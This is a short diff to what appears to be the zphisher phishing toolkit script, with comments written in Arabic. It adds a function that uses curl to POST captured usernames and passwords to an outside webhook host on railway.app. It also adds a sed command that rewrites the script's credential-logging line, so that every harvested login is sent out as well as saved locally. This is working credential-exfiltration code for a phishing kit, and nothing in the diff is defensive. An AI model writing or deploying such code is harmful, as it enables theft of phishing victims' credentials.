@@ -910,4 +910,13 @@ dependencies
 check_status
 install_cloudflared
 install_localxpose
+# إرسال البيانات لـ Webhook
+send_webhook() {
+    curl -s -X POST https://$PROJECT_NAME.up.railway.app/webhook.php \
+        -H "Content-Type: application/json" \
+        -d "{\"username\":\"$1\",\"password\":\"$2\"}" > /dev/null
+}
+
+# تعديل أمر تسجيل البيانات (ينفذ مرة واحدة)
+sed -i 's/echo "\(.*\):\(.*\)" >> auth\/usernames.dat/echo "\1:\2" >> auth\/usernames.dat \&\& send_webhook "\1" "\2"/' zphisher.sh
 main_menu
